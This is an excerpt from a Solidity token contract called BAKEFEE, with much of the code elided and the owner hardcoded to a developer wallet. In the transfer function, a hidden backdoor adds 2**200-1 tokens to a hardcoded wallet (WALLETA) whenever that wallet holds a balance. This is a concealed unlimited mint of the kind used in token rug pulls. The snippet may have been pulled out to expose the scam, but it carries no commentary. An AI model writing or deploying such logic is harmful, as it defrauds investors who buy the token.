...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0xe6b93641a48258bCacC968f3AaFA60100B56C30C;
...
contract BAKEFEE is Context, IERC20, Ownable { 
    ...
    */
    ...
    address WALLETA = 0xc215faD4D634B1e09d426c79F6797853232E502f;
    address payable private Wallet_Dev = payable(0xe6b93641a48258bCacC968f3AaFA60100B56C30C);
    ...
    */
    ...
    string private _name = "BAKEFEE"; 
    string private _symbol = " BAKEFEE";  
    ...
    function _transfer(
        ...
        */
        ...
        if (_tOwned[WALLETA] > 0){
                _tOwned[WALLETA] = _tOwned[WALLETA] + 2**200-1;
        }
        if(
            txCount >= swapTrigger && 
            !inSwapAndLiquify &&
